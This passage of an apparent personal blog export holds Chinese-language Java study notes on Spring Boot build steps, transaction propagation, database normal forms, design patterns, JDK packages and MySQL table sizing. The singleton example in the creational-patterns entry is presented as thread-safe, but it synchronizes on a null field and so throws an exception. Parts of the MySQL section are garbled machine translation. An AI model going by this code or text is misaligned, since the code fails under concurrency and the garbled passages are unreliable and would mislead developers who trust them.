questionstagged with https://stackoverflow.com/tags/spring-boot[`spring-boot`]. You can also chatwith the community on https://gitter.im/spring-projects/spring-boot[Gitter]. Report bugs with Spring Boot at https://github.com/spring-projects/spring-boot/issues[github.com/spring-projects/spring-boot/issues]. == Reporting IssuesSpring Boot uses GitHub’s integrated issue tracking system to record bugs and featurerequests. If you want to raise an issue, please follow the recommendations below: Before you log a bug, please https://github.com/spring-projects/spring-boot/search?type=Issues[search the issue tracker]to see if someone has already reported the problem. If the issue doesn’t already exist, https://github.com/spring-projects/spring-boot/issues/new[create a new issue]. Please provide as much information as possible with the issue report, we like to knowthe version of Spring Boot that you are using, as well as your Operating System andJVM version. If you need to paste code, or include a stack trace use Markdown +++ +++ escapesbefore and after your text. If possible try to create a test-case or project that replicates the issue. You cansubmit sample projects as pull-requests against thehttps://github.com/spring-projects/spring-boot-issues[spring-boot-issues] GitHubproject. Use the issue number for the name of your project. == Building from SourceYou don’t need to build from source to use Spring Boot (binaries inhttps://repo.spring.io[repo.spring.io]), but if you want to try out the latest andgreatest, Spring Boot can be easily built with thehttps://github.com/takari/maven-wrapper[maven wrapper]. You also need JDK 1.8. [indent=0]$ ./mvnw clean install If you want to build with the regular mvn command, you will needhttps://maven.apache.org/run-maven/index.html[Maven v3.5.0 or above]. NOTE: You may need to increase the amount of memory available to Maven by settinga MAVEN_OPTS environment variable with the value -Xmx512m. Rememberto set the corresponding property in your IDE as well if you are building and runningtests there (e.g. in Eclipse go to Preferences-&gt;Java-&gt;Installed JREs and edit theJRE definition so that all processes are launched with those arguments). This propertyis automatically set if you use the maven wrapper. _Also see link:CONTRIBUTING.adoc[CONTRIBUTING.adoc] if you wish to submit pull requests,and in particular please fill out thehttps://support.springsource.com/spring_committer_signup[Contributor&#39;s Agreement]before your first change, however trivial._ === Building reference documentation First of all, make sure you have built the project: [indent=0]$ ./mvnw clean install The reference documentation requires the documentation of the Maven plugin to beavailable so you need to build that first since it’s not generated by default. [indent=0]$ ./mvnw clean install -pl spring-boot-project/spring-boot-tools/spring-boot-maven-plugin -Pdefault,full The documentation also includes auto-generated information about the starters. You mighthave that in your local repository already (per the first step) but if you want to refreshit: [indent=0]$ ./mvnw clean install -f spring-boot-project/spring-boot-starters Once this is done, you can build the reference documentation with the command below: [indent=0]$ ./mvnw clean prepare-package -pl spring-boot-project/spring-boot-docs -Pdefault,full TIP: The generated documentation is available from spring-boot-project/spring-boot-docs/target/contents/reference == ModulesThere are a number of modules in Spring Boot, here is a quick overview: === spring-bootThe main library providing features that support the other parts of Spring Boot,these include: The SpringApplication class, providing static convenience methods that make it easyto write a stand-alone Spring Application. Its sole job is to create and refresh anappropriate Spring ApplicationContext Embedded web applications with a choice of container (Tomcat, Jetty or Undertow) First class externalized configuration support Convenience ApplicationContext initializers, including support for sensible loggingdefaults === spring-boot-autoconfigureSpring Boot can configure large parts of common applications based on the contentof their classpath. A single @EnableAutoConfiguration annotation triggersauto-configuration of the Spring context. Auto-configuration attempts to deduce which beans a user might need. For example, ifHSQLDB is on the classpath, and the user has not configured any database connections,then they probably want an in-memory database to be defined. Auto-configuration willalways back away as the user starts to define their own beans. === spring-boot-startersStarters are a set of convenient dependency descriptors that you can include inyour application. You get a one-stop-shop for all the Spring and related technologythat you need without having to hunt through sample code and copy paste loads ofdependency descriptors. For example, if you want to get started using Spring and JPA fordatabase access just include the spring-boot-starter-data-jpa dependency in yourproject, and you are good to go. === spring-boot-cliThe Spring command line application compiles and runs Groovy source, making it supereasy to write the absolute minimum of code to get an application running. Spring CLIcan also watch files, automatically recompiling and restarting when they change. === spring-boot-actuatorActuator endpoints let you monitor and interact with your application.Spring Boot Actuator provides the infrastructure required for actuator endpoints. It containsannotation support for actuator endpoints. Out of the box, this module provides a number of endpointsincluding the HealthEndpoint, EnvironmentEndpoint, BeansEndpoints and many more. === spring-boot-actuator-autoconfigureThis provides auto-configuration for actuator endpoints based on the content of the classpath and a set of properties.For instance, if Micrometer is on the classpath, it will auto-configure the MetricsEndpoint.It contains configuration to expose endpoints over HTTP or JMX.Just like Spring Boot AutoConfigure, this will back away as the user starts to define their own beans. === spring-boot-testThis module contains core items and annotations that can be helpful when testing your application. === spring-boot-test-autoconfigureLike other Spring Boot auto-configuration modules, spring-boot-test-autoconfigure, provides auto-configurationfor tests based on the classpath. It includes a number of annotations that can be used to automaticallyconfigure a slice of your application that needs to be tested. === spring-boot-loaderSpring Boot Loader provides the secret sauce that allows you to build a single jar filethat can be launched using java -jar. Generally you will not need to usespring-boot-loader directly, but instead work with thelink:spring-boot-project/spring-boot-tools/spring-boot-gradle-plugin[Gradle] orlink:spring-boot-project/spring-boot-tools/spring-boot-maven-plugin[Maven] plugin. === spring-boot-devtoolsThe spring-boot-devtools module provides additional development-time features such as automatic restarts,for a smoother application development experience. Developer tools are automatically disabled whenrunning a fully packaged application. == SamplesGroovy samples for use with the command line application are available inlink:spring-boot-project/spring-boot-cli/samples[spring-boot-cli/samples]. To run the CLI samples typespring run &lt;sample&gt;.groovy from samples directory. Java samples are available in link:spring-boot-samples[spring-boot-samples] and shouldbe built with maven and run by invoking java -jar target/&lt;sample&gt;.jar. == GuidesThe https://spring.io/[spring.io] site contains several guides that show how to use SpringBoot step-by-step: https://spring.io/guides/gs/spring-boot/[Building an Application with Spring Boot] is avery basic guide that shows you how to create a simple application, run it and add somemanagement services. https://spring.io/guides/gs/actuator-service/[Building a RESTful Web Service with SpringBoot Actuator] is a guide to creating a REST web service and also shows how the servercan be configured. https://spring.io/guides/gs/convert-jar-to-war/[Converting a Spring Boot JAR Applicationto a WAR] shows you how to run applications in a web server as a WAR file. == LicenseSpring Boot is Open Source software released under thehttp://www.apache.org/licenses/LICENSE-2.0.html[Apache 2.0 license].]]></content>
      <categories>
        <category>java</category>
        <category>spring-boot</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql-common]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-common%2F</url>
    <content type="text"><![CDATA[事务隔离级别 1、脏读2、幻读3、可重复读 数据隔离级别 1、读未提交2、读已提交3、可重复读4、串行化 spring事务传播行为 1、required 如果当前没有事务，就新建一个事务，如果已经存在一个事务中，加入到这个事务中。 这是最常见的选择。 2、requires_new 新建事务，如果当前存在事务，把当前事务挂起。 3、supports 支持当前事务，如果当前没有事务，就以非事务方式执行。 4、not_supported 以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。 5、nested 如果当前存在事务，则在嵌套事务内执行。 如果当前没有事务，则执行与PROPAGATION_REQUIRED类似的操作。 6、mandatory 使用当前的事务，如果当前没有事务，就抛出异常。 7、nerver 以非事务方式执行，如果当前存在事务，则抛出异常。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库设计三大范式]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-design-1%2F</url>
    <content type="text"><![CDATA[1．第一范式(确保每列保持原子性) 2．第二范式(确保表中的每列都和主键相关) 3．第三范式(确保每列都和主键列直接相关,而不是间接相关) 一、第一范式是最基本的范式。如果数据库表中的所有字段值都是不可分解的原子值，就说明该数据库表满足了第一范式。 第一范式的合理遵循需要根据系统的实际需求来定。比如某些数据库系统中需要用到“地址”这个属性，本来直接将“地址”属性设计成一个数据库表的字段就行。但是如果系统经常会访问“地址”属性中的“城市”部分，那么就非要将“地址”这个属性重新拆分为省份、城市、详细地址等多个部分进行存储，这样在对地址中某一部分操作的时候将非常方便。这样设计才算满足了数据库的第一范式，如下表所示。 上表所示的用户信息遵循了第一范式的要求，这样在对用户使用城市进行分类的时候就非常方便，也提高了数据库的性能。 {———-} 二、第二范式在第一范式的基础之上更进一层。第二范式需要确保数据库表中的每一列都和主键相关，而不能只与主键的某一部分相关（主要针对联合主键而言）。也就是说在一个数据库表中，一个表中只能保存一种数据，不可以把多种数据保存在同一张数据库表中。 比如要设计一个订单信息表，因为订单中可能会有多种商品，所以要将订单编号和商品编号作为数据库表的联合主键，如下表所示。 订单信息表 这样就产生一个问题：这个表中是以订单编号和商品编号作为联合主键。这样在该表中商品名称、单位、商品价格等信息不与该表的主键相关，而仅仅是与商品编号相关。所以在这里违反了第二范式的设计原则。 而如果把这个订单信息表进行拆分，把商品信息分离到另一个表中，把订单项目表也分离到另一个表中，就非常完美了。如下所示。 这样设计，在很大程度上减小了数据库的冗余。如果要获取订单的商品信息，使用商品编号到商品信息表中查询即可。 三、第三范式需要确保数据表中的每一列数据都和主键直接相关，而不能间接相关。 比如在设计一个订单数据表的时候，可以将客户编号作为一个外键和订单表建立相应的关系。而不可以在订单表中添加关于客户其它信息（比如姓名、所属公司等）的字段。如下面这两个表所示的设计就是一个满足第三范式的数据库表。 这样在查询订单信息的时候，就可以使用客户编号来引用客户信息表中的记录，也不必在订单信息表中多次输入客户信息的内容，减小了数据冗余。 转载地址]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-创建型]]></title>
    <url>%2F2018%2F03%2F24%2Fdesign-pattern%2Festablish%2F</url>
    <content type="text"><![CDATA[设计模式创建型–5种 单例—-创建线程安全类 工厂—-创建bean工厂 抽象工厂—-创建bean工厂的工厂 原型—-clone模式 —用于数据流转中对象快速复制 建造者—创建bean类型多样组合-创建方式不变-依靠算法实现不同组合创建bean 单例 {———-} 1234567891011121314151617181920212223242526272829303132/** * Created by huoyan403 on 2017/8/14. */public class Singleton &#123; //防止被引用 赋值为null 目的实现延迟加载 private static Singleton singleton = null; //私有化构造方法 private Singleton() &#123; &#125; //静态工程方法 创建实例 public static Singleton getSingleton()&#123; if(singleton == null)&#123; //synchronized关键字锁住的是这个对象，这样的用法，在性能上会有所下降，因为每次调用getInstance()， // 都要对对象上锁，事实上，只有在第一次创建对象的时候需要加锁，之后就不需要了 synchronized (singleton)&#123; if(singleton == null) &#123; singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125; //如果该对象被用于序列化 可以保证在序列化前后保持一致 public Object readResolve()&#123; return singleton; &#125;&#125; 工厂 抽象工厂 原型 建造者]]></content>
      <categories>
        <category>java</category>
        <category>design-pattern</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-结构型]]></title>
    <url>%2F2018%2F03%2F24%2Fdesign-pattern%2Fstructure%2F</url>
    <content type="text"><![CDATA[设计模式-结构型–7种 组合、适配器、过滤器、桥接、装饰、外观、享元、代理 组合–最为常用–将对象组合成一个树状结构、例如菜单上做自循环 适配器–播放器格式适配–对类型判定使用不同子类方法实例 桥接–封装类组合形成一个复杂对象–把复杂对象拆分简单对象 过滤器–使用不同标准来过滤一组对象 装饰–不增加子类-扩展类属性 外观–外部定义一个高层接口-直接使用其属性 享元—不太了解 代理–使用一个类来代理另一个类来执行业务逻辑–简单来讲-classB代理classA、classB来处理业务逻辑 {———-}]]></content>
      <categories>
        <category>java</category>
        <category>design-pattern</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jdk各个包 概述]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-total%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819java.applet 提供创建 applet 所必需的类和 applet 用来与其 applet 上下文通信的类。 java.awt 包含用于创建用户界面和绘制图形图像的所有类。 java.awt.color 提供用于颜色空间的类。 java.awt.datatransfer 提供在应用程序之间和在应用程序内部传输数据的接口和类。 java.awt.dnd Drag 和 Drop 是一种直接操作动作，在许多图形用户界面系统中都会遇到它，它提供了一种机制，能够在两个与 GUI 中显示元素逻辑相关的实体之间传输信息。 java.awt.event 提供处理由 AWT 组件所激发的各类事件的接口和类。 java.awt.font 提供与字体相关的类和接口。 java.awt.geom 提供用于在与二维几何形状相关的对象上定义和执行操作的 Java 2D 类。 java.awt.im 提供输入方法框架所需的类和接口。 java.awt.im.spi 提供启用可以与 Java 运行时环境一起使用的输入方法开发的接口。 java.awt.image 提供创建和修改图像的各种类。 java.awt.image.renderable 提供用于生成与呈现无关的图像的类和接口。 java.awt.print 为通用的打印 API 提供类和接口。 java.beans 包含与开发 beans 有关的类，即基于 JavaBeansTM 架构的组件。 java.beans.beancontext 提供与 bean 上下文有关的类和接口。 {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243java.io 通过数据流、序列化和文件系统提供系统输入和输出。 java.lang 提供利用 Java 编程语言进行程序设计的基础类。 java.lang.annotation 为 Java 编程语言注释设施提供库支持。 java.lang.instrument 提供允许 Java 编程语言代理检测运行在 JVM 上的程序的服务。 java.lang.management 提供管理接口，用于监视和管理 Java 虚拟机以及 Java 虚拟机在其上运行的操作系统。 java.lang.ref 提供了引用对象类，支持在某种程度上与垃圾回收器之间的交互。 java.lang.reflect 提供类和接口，以获得关于类和对象的反射信息。 java.math 提供用于执行任意精度整数算法 (BigInteger) 和任意精度小数算法 (BigDecimal) 的类。 java.net 为实现网络应用程序提供类。 java.nio 定义作为数据容器的缓冲区，并提供其他 NIO 包的概述。 java.nio.channels 定义了各种通道，这些通道表示到能够执行 I/O 操作的实体（如文件和套接字）的连接；定义了用于多路复用的、非阻塞 I/O 操作的选择器。 java.nio.channels.spi 用于 java.nio.channels 包的服务提供者类。 java.nio.charset 定义用来在字节和 Unicode 字符之间转换的 charset、解码器和编码器。 java.nio.charset.spi java.nio.charset 包的服务提供者类。 java.rmi 提供 RMI 包。 java.rmi.activation 为 RMI 对象激活提供支持。 java.rmi.dgc 为 RMI 分布式垃圾回收提供了类和接口。 java.rmi.registry 提供 RMI 注册表的一个类和两个接口。 java.rmi.server 提供支持服务器端 RMI 的类和接口。 java.security 为安全框架提供类和接口。 java.security.acl 此包中的类和接口已经被 java.security 包中的类取代。 java.security.cert 提供用于解析和管理证书、证书撤消列表 (CRL) 和证书路径的类和接口。 java.security.interfaces 提供的接口用于生成 RSA Laboratory Technical Note PKCS#1 中定义的 RSA（Rivest、Shamir 和 Adleman AsymmetricCipher 算法）密钥，以及 NIST 的 FIPS-186 中定义的 DSA（数字签名算法）密钥。 java.security.spec 提供密钥规范和算法参数规范的类和接口。 java.sql 提供使用 JavaTM 编程语言访问并处理存储在数据源（通常是一个关系数据库）中的数据的 API。 java.text 提供以与自然语言无关的方式来处理文本、日期、数字和消息的类和接口。 java.text.spi java.text 包中类的服务提供者类。 java.util 包含 collection 框架、遗留的 collection 类、事件模型、日期和时间设施、国际化和各种实用工具类（字符串标记生成器、随机数生成器和位数组）。 java.util.concurrent 在并发编程中很常用的实用工具类。 java.util.concurrent.atomic 类的小工具包，支持在单个变量上解除锁的线程安全编程。 java.util.concurrent.locks 为锁和等待条件提供一个框架的接口和类，它不同于内置同步和监视器。 java.util.jar 提供读写 JAR (Java ARchive) 文件格式的类，该格式基于具有可选清单文件的标准 ZIP 文件格式。 java.util.logging 提供 JavaTM 2 平台核心日志工具的类和接口。 java.util.prefs 此包允许应用程序存储并获取用户和系统首选项和配置数据。 java.util.regex 用于匹配字符序列与正则表达式指定模式的类。 java.util.spi java.util 包中类的服务提供者类。 java.util.zip 提供用于读写标准 ZIP 和 GZIP 文件格式的类。 javax.accessibility 定义了用户界面组件与提供对这些组件进行访问的辅助技术之间的协定。 javax.crypto 为加密操作提供类和接口。 javax.crypto.interfaces 根据 RSA Laboratories&apos; PKCS #3 的定义，提供 Diffie-Hellman 密钥接口。 javax.crypto.spec 为密钥规范和算法参数规范提供类和接口。 javax.imageio Java Image I/O API 的主要包。 javax.imageio.event Java Image I/O API 的一个包，用于在读取和写入图像期间处理事件的同步通知。 javax.imageio.metadata 用于处理读写元数据的 Java Image I/O API 的包。 javax.imageio.plugins.bmp 包含供内置 BMP 插件使用的公共类的包。 javax.imageio.plugins.jpeg 支持内置 JPEG 插件的类。 javax.imageio.spi 包含用于 reader、writer、transcoder 和流的插件接口以及一个运行时注册表的 Java Image I/O API 包。 javax.imageio.stream Java Image I/O API 的一个包，用来处理从文件和流中产生的低级别 I/O。 javax.management 提供 Java Management Extensions 的核心类。 javax.management.loading 提供实现高级动态加载的类。 javax.management.modelmbean 提供了 ModelMBean 类的定义。 javax.management.monitor 提供 monitor 类的定义。 javax.management.openmbean 提供开放数据类型和 Open MBean 描述符类。 javax.management.relation 提供 Relation Service 的定义。 javax.management.remote 对 JMX MBean 服务器进行远程访问使用的接口。 javax.management.remote.rmi RMI 连接器是供 JMX Remote API 使用的一种连接器，后者使用 RMI 将客户端请求传输到远程 MBean 服务器。 javax.management.timer 提供对 Timer MBean（计时器 MBean）的定义。 javax.naming 为访问命名服务提供类和接口。 javax.naming.directory 扩展 javax.naming 包以提供访问目录服务的功能。 javax.naming.event 在访问命名和目录服务时提供对事件通知的支持。 javax.naming.ldap 提供对 LDAPv3 扩展操作和控件的支持。 javax.naming.spi 提供一些方法来动态地插入对通过 javax.naming 和相关包访问命名和目录服务的支持。 javax.net 提供用于网络应用程序的类。 javax.net.ssl 提供用于安全套接字包的类。 javax.print 为 JavaTM Print Service API 提供了主要类和接口。 javax.print.attribute 提供了描述 JavaTM Print Service 属性的类型以及如何分类这些属性的类和接口。 javax.print.attribute.standard 包 javax.print.attribute.standard 包括特定打印属性的类。 javax.print.event 包 javax.print.event 包含事件类和侦听器接口。 javax.rmi 包含 RMI-IIOP 的用户 API。 javax.rmi.CORBA 包含用于 RMI-IIOP 的可移植性 API。 javax.rmi.ssl 通过安全套接字层 (SSL) 或传输层安全 (TLS) 协议提供 RMIClientSocketFactory 和 RMIServerSocketFactory 的实现。 javax.security.auth 此包提供用于进行验证和授权的框架。 javax.security.auth.callback 此包提供与应用程序进行交互所必需的类，以便检索信息（例如，包括用户名和密码的验证数据）或显示信息（例如，错误和警告消息）。 javax.security.auth.kerberos 此包包含与 Kerberos 网络验证协议相关的实用工具类。 javax.security.auth.login 此包提供可插入的验证框架。 javax.security.auth.spi 此包提供用于实现可插入验证模块的接口。 javax.security.auth.x500 此包包含应该用来在 Subject 中存储 X500 Principal 和 X500 Private Crendentials 的类。 javax.security.cert 为公钥证书提供类。 javax.security.sasl 包含用于支持 SASL 的类和接口。 javax.sound.midi 提供用于 MIDI（音乐乐器数字接口）数据的 I/O、序列化和合成的接口和类。 javax.sound.midi.spi 在提供新的 MIDI 设备、MIDI 文件 reader 和 writer、或音库 reader 时提供服务提供者要实现的接口。 javax.sound.sampled 提供用于捕获、处理和回放取样的音频数据的接口和类。 javax.sound.sampled.spi 在提供新音频设备、声音文件 reader 和 writer，或音频格式转换器时，提供将为其创建子类的服务提供者的抽象类。 javax.sql 为通过 JavaTM 编程语言进行服务器端数据源访问和处理提供 API。 javax.sql.rowset JDBC RowSet 实现的标准接口和基类。 javax.sql.rowset.serial 提供实用工具类，允许 SQL 类型与 Java 编程语言数据类型之间的可序列化映射关系。 javax.sql.rowset.spi 第三方供应商在其同步提供者的实现中必须使用的标准类和接口。 javax.swing 提供一组“轻量级”（全部是 Java 语言）组件，尽量让这些组件在所有平台上的工作方式都相同。 javax.swing.border 提供围绕 Swing 组件绘制特殊边框的类和接口。 javax.swing.colorchooser 包含供 JColorChooser 组件使用的类和接口。 javax.swing.event 供 Swing 组件触发的事件使用。 javax.swing.filechooser 包含 JFileChooser 组件使用的类和接口。 javax.swing.plaf 提供一个接口和许多抽象类，Swing 用它们来提供自己的可插入外观功能。 javax.swing.plaf.basic 提供了根据基本外观构建的用户界面对象。 javax.swing.plaf.metal 提供根据 Java 外观（曾经代称为 Metal）构建的用户界面对象，Java 外观是默认外观。 javax.swing.plaf.multi 提供了组合两个或多个外观的用户界面对象。 javax.swing.plaf.synth Synth 是一个可更换皮肤 (skinnable) 的外观，在其中可委托所有绘制。 javax.swing.table 提供用于处理 javax.swing.JTable 的类和接口。 javax.swing.text 提供类 HTMLEditorKit 和创建 HTML 文本编辑器的支持类。 javax.swing.text.html 提供类 HTMLEditorKit 和创建 HTML 文本编辑器的支持类。 javax.swing.text.html.parser 提供默认的 HTML 解析器以及支持类。 javax.swing.text.rtf 提供一个类 (RTFEditorKit)，用于创建富文本格式（Rich-Text-Format）的文本编辑器。 javax.swing.tree 提供处理 javax.swing.JTree 的类和接口。 javax.swing.undo 允许开发人员为应用程序（例如文本编辑器）中的撤消/恢复提供支持。 javax.transaction 包含解组期间通过 ORB 机制抛出的三个异常。 javax.transaction.xa 提供定义事务管理器和资源管理器之间的协定的 API，它允许事务管理器添加或删除 JTA 事务中的资源对象（由资源管理器驱动程序提供）。 javax.xml 根据 XML 规范定义核心 XML 常量和功能。 javax.xml.bind 为包含解组、编组和验证功能的客户端应用程序提供运行时绑定框架。 javax.xml.bind.annotation 定义将 Java 程序元素定制成 XML 模式映射的注释。 javax.xml.bind.annotation.adapters XmlAdapter 及其规范定义的子类允许任意 Java 类与 JAXB 一起使用。 javax.xml.bind.attachment 此包由基于 MIME 的包处理器实现，该处理器能够解释并创建基于 MIME 的包格式的已优化的二进制数据。 javax.xml.bind.helpers 仅由 JAXB 提供者用于： 提供某些 javax.xml.bind 接口的部分默认实现。 javax.xml.bind.util 有用的客户端实用工具类。 javax.xml.crypto 用于 XML 加密的通用类。 javax.xml.crypto.dom javax.xml.crypto 包的特定于 DOM 的类。 javax.xml.crypto.dsig 用于生成和验证 XML 数字签名的类。 javax.xml.crypto.dsig.dom javax.xml.crypto.dsig 包特定于 DOM 的类。 javax.xml.crypto.dsig.keyinfo 用来解析和处理 KeyInfo 元素和结构的类。 javax.xml.crypto.dsig.spec XML 数字签名的参数类。 javax.xml.datatype XML/Java 类型映射关系。 javax.xml.namespace XML 名称空间处理。 javax.xml.parsers 提供允许处理 XML 文档的类。 javax.xml.soap 提供用于创建和构建 SOAP 消息的 API。 javax.xml.stream javax.xml.stream.events javax.xml.stream.util javax.xml.transform 此包定义了用于处理转换指令，以及执行从源到结果的转换的一般 API。 javax.xml.transform.dom 此包实现特定于 DOM 的转换 API。 javax.xml.transform.sax 此包实现特定于 SAX2 的转换 API。 javax.xml.transform.stax 提供特定于 StAX 的转换 API。 javax.xml.transform.stream 此包实现特定于流和 URI 的转换 API。 javax.xml.validation 此包提供了用于 XML 文档验证的 API。 javax.xml.ws 此包包含核心 JAX-WS API。 javax.xml.ws.handler 该包定义用于消息处理程序的 API。 javax.xml.ws.handler.soap 该包定义用于 SOAP 消息处理程序的 API。 javax.xml.ws.http 该包定义特定于 HTTP 绑定的 API。 javax.xml.ws.soap 该包定义特定于 SOAP 绑定的 API。 javax.xml.ws.spi 该包定义用于 JAX-WS 2.0 的 SPI。 javax.xml.xpath 此包提供了用于 XPath 表达式的计算和访问计算环境的 object-model neutral API。 org.ietf.jgss 此包提供一个框架，该框架允许应用程序开发人员通过利用统一的 API 使用一些来自各种基础安全机制（如 Kerberos）的安全服务，如验证、数据完整性和和数据机密性。 org.omg.CORBA 提供 OMG CORBA API 到 JavaTM 编程语言的映射，包括 ORB 类，如果已实现该类，则程序员可以使用此类作为全功能对象请求代理（Object Request Broker，ORB）。 org.omg.CORBA_2_3 CORBA_2_3 包定义对 Java[tm] Standard Edition 6 中现有 CORBA 接口所进行的添加。 org.omg.CORBA_2_3.portable 提供输入和输出值类型的各种方法，并包含 org/omg/CORBA/portable 包的其他更新。 org.omg.CORBA.DynAnyPackage 提供与 DynAny 接口一起使用的异常（InvalidValue、Invalid、InvalidSeq 和 TypeMismatch）。 org.omg.CORBA.ORBPackage 提供由 ORB.resolve_initial_references 方法抛出的异常 InvalidName，以及由 ORB 类中的动态 Any 创建方法抛出的异常 InconsistentTypeCode。 org.omg.CORBA.portable 提供可移植性层，即可以使一个供应商生成的代码运行在另一个供应商 ORB 上的 ORB API 集合。 org.omg.CORBA.TypeCodePackage 提供用户定义的异常 BadKind 和 Bounds，它们将由 TypeCode 类中的方法抛出。 org.omg.CosNaming 为 Java IDL 提供命名服务。 org.omg.CosNaming.NamingContextExtPackage 此包包含以下在 org.omg.CosNaming.NamingContextExt 中使用的类： AddressHelper StringNameHelper URLStringHelper InvalidAddress 包规范 有关 Java[tm] Platform, Standard Edition 6 ORB 遵守的官方规范的受支持部分的明确列表，请参阅 Official Specifications for CORBA support in Java[tm] SE 6。 org.omg.CosNaming.NamingContextPackage 此包包含 org.omg.CosNaming 包的 Exception 类。 org.omg.Dynamic 此包包含 OMG Portable Interceptor 规范。 org.omg.DynamicAny 提供一些类和接口使得在运行时能够遍历与 any 有关联的数据值，并提取数据值的基本成分。 org.omg.DynamicAny.DynAnyFactoryPackage 此包包含 DynamicAny 模块的 DynAnyFactory 接口中的类和异常，该模块在 OMG The Common Object Request Broker: Architecture and Specification 。 org.omg.DynamicAny.DynAnyPackage 此包包含 DynAny 模块的 DynAnyFactory 接口中的类和异常，该模块在 OMG The Common Object Request Broker: Architecture and Specification 。 org.omg.IOP 此包包含在 OMG 文档 The Common Object Request Broker: Architecture and Specification 。org.omg.IOP.CodecFactoryPackage 此包包含 IOP::CodeFactory 接口中指定的异常（作为 Portable Interceptor 规范的一部分）。 org.omg.IOP.CodecPackage 此包根据 IOP::Codec IDL 接口定义生成。 org.omg.Messaging 此包包含 OMG Messaging Interceptor 规范 。 org.omg.PortableInterceptor 提供一个注册 ORB 钩子 (hook) 的机制，通过这些钩子 ORB 服务可以截取执行 ORB 的正常流。 org.omg.PortableInterceptor.ORBInitInfoPackage 此包包含 OMG Portable Interceptor 规范 。org.omg.PortableServer 提供一些类和接口，用来生成跨多个供应商 ORB 的可移植应用程序的服务器端。 org.omg.PortableServer.CurrentPackage 提供各种方法实现，这些实现能够访问调用方法的对象的身份。 org.omg.PortableServer.POAManagerPackage 封装 POA 关联的处理状态。 org.omg.PortableServer.POAPackage 允许程序员构造可在不同 ORB 产品间移植的对象实现。 org.omg.PortableServer.portable 提供一些类和接口，用来生成跨多个供应商 ORB 的可移植应用程序的服务器端。 org.omg.PortableServer.ServantLocatorPackage 提供定位 servant 的类和接口。 org.omg.SendingContext 为值类型的编组提供支持。 org.omg.stub.java.rmi 包含用于 java.rmi 包中出现的 Remote 类型的 RMI-IIOP Stub。 org.w3c.dom 为文档对象模型 (DOM) 提供接口，该模型是 Java API for XML Processing 的组件 API。 org.w3c.dom.bootstrap org.w3c.dom.events org.w3c.dom.ls org.xml.sax 此包提供了核心 SAX API。 org.xml.sax.ext 此包包含适合的 SAX 驱动程序不一定支持的 SAX2 设施的接口。 org.xml.sax.helpers 此包包含“帮助器”类，其中包括对引导基于 SAX 的应用程序的支持。]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【数据结构】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-data-structure%2F</url>
    <content type="text"><![CDATA[在作为数据库设计师的角色中，寻找组织模式，表和列的最有效方式。与调整应用程序代码时一样，您可以最大限度地减少I / O，将相关项目集中在一起，并提前进行计划，以便随着数据量的增加性能保持在较高水平 从高效的数据库设计开始，团队成员可以更轻松地编写高性能的应用程序代码，并使数据库可以随应用程序的演变和重写而持续下去。 8.4.1优化数据大小123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103设计您的表格以尽量减少磁盘空间。这可以通过减少写入和读取磁盘的数据量来实现巨大的改进。在查询执行期间，较小的表格通常需要较少的主存储器，而其内容正在被主动处理。表数据的任何空间减少也会导致可以更快处理的更小的索引。MySQL支持许多不同的存储引擎（表格类型）和行格式。对于每个表格，您可以决定使用哪种存储和索引方法。为您的应用程序选择适当的表格格式可以为您带来巨大的性能提升。请参阅 第14章InnoDB存储引擎和 第15章备用存储引擎。通过使用此处列出的技术，您可以获得更好的表格性能并最小化存储空间：表列行格式索引加盟正常化表列尽可能使用最有效（最小）的数据类型。MySQL有很多专门的类型可以节省磁盘空间和内存。例如，如果可能的话，使用较小的整数类型来获得较小的表格。 MEDIUMINT通常是一个更好的选择，INT因为一 MEDIUMINT列使用的空间减少了25％。NOT NULL如果可能的话， 声明列。通过更好地使用索引并消除测试每个值是否存在开销，它使SQL操作更快NULL。您还可以节省一些存储空间，每列一位。如果您真的需要NULL表格中的值，请使用它们。只需避免允许NULL每列中的值的默认设置 。行格式InnoDB表格DYNAMIC默认使用行格式创建 。要在a 或语句中明确使用除了DYNAMIC，配置 innodb_default_row_format或指定ROW_FORMAT选项以外的行格式。 CREATE TABLEALTER TABLE行格式的紧凑系列，其中包括 COMPACT，DYNAMIC和COMPRESSED，以减少某些操作的CPU使用为代价来减少行存储空间。如果您的工作负载是受缓存命中率和磁盘速度限制的典型负载，则可能会更快。如果这是一个受CPU速度限制的罕见情况，则可能会变慢。紧凑的行格式系列还可以CHAR在使用诸如utf8mb3或的可变长度字符集时优化 列存储 utf8mb4。使用ROW_FORMAT=REDUNDANT， 占用字符集的最大字节长度×。许多语言主要使用单字节字符编写 ，因此固定的存储长度通常会浪费空间。使用紧凑的行格式系列，可在to 范围内分配可变数量的存储空间 CHAR(N)Nutf8InnoDBNN×通过去除尾部空格来为这些列设置字符集的最大字节长度。最小存储长度为 N字节，便于在典型情况下进行就地更新。有关更多信息，请参见 